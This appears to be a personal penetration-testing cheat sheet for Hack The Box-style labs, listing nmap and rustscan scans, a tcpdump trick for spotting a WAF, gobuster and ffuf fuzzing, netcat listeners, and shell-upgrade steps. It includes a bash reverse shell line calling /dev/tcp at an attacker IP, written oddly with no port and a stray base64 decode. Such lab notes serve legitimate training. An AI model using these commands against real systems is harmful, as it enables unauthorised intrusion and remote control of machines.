
####Recon
#ippsec-nmap 
Initial ippsec nmap scan
```
sudo nmap -sC -sV -vv -oA nmap/analytics 10.129.60.215
```

#####Recon
Initial Rust Scan:
```
sudo rustscan -a --ulimit 5000
```

#####Recon
#Reverseproxy #recon #waf 
When your looking at two domains hosted on the same ip, like a domain and a subdomain.  You can ascertain if theres a waf or something inbetween one of them by looking at the ttl of tcpdump.  Capture the two domains in burp(repeater) and then send them while running the following command.
```
sudo tcpdump -i tun0 -v -n src port 80
```



####Gobuster
~~~
gobuster dir -u http://10.129.4.235/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -t 50 -x php,html,txt -r -k --no-progress | tee gobuster-live.txt 
~~~

#####gobuster vhost scan
```
gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

#####FUFF
~~~
ffuf -u http://10.129.4.235:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -e .php,.html,.txt,.js,.bak,.old,.zip -fc 404 -o ffuf-medium.json -of json
~~~

#####Proving our webshell is who and where we say it is
id
hostname
ifconfig
(Screenshot)

#####Netcat listener
nc -nvlp 9001
#####Netcat listener (better)
rlwrap nc -lvnp 9001

#####Python http server
python3 -m http.server
python -m SimpleHttpServer 80

Write to /dev/shm

#####Bash reverse shell
echo -n 'bash -i >& /dev/tcp/10.10.17.141 0>&1' | base64 -d 

#####Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
(needs script module ('which script'))
```
python3 -c 'import pty; pty.spawn("/bin/bash")'  
CTRL+Z  
stty raw -echo; fg  
export TERM=xterm
```
